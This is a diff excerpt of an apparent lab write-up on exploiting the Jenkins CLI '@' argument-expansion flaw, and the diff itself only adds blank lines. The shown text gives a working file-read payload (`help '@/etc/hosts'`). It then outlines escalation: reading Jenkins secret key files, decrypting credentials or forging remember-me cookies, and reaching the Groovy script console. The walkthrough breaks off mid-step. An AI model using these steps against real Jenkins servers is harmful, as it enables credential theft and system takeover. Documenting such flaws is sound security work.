@@ -42,12 +42,15 @@ Args4j by default parses command-line arguments that begin with the `@` characte
 ## Exploitation Walkthrough
 
 ### 1. Downloading the Jenkins CLI Jar
+
 Jenkins distributes its official CLI client directly from the running web interface:
+
 ```bash
 wget http://localhost:8122/jnlpJars/jenkins-cli.jar -O /tmp/jenkins-cli.jar
 ```
 
 ### 2. Arbitrary File Read via CLI Argument Expansion
+
 Target commands that reflect error messages or help output, such as `help`, `connect-node`, or `reload-job`:
 
 ```bash
@@ -61,7 +64,9 @@ java -jar /tmp/jenkins-cli.jar -s http://localhost:8122/ help '@/etc/hosts'
 The error message emitted by Jenkins will reflect lines from the requested file.
 
 ### 3. Escalating from Arbitrary File Read to RCE
+
 In environments where Overall/Read permission is granted to anonymous users (or with captured low-privilege credentials), attackers can read sensitive cryptographic keys:
+
 1. Read `/var/jenkins_home/secrets/master.key` and `/var/jenkins_home/secrets/hudson.util.Secret`.
 2. Decrypt stored credentials or forge administrative remember-me cookies (`remember-me` tokens).
 3. Access the Jenkins Groovy Script Console (`http://localhost:8122/script`) to run arbitrary system commands:
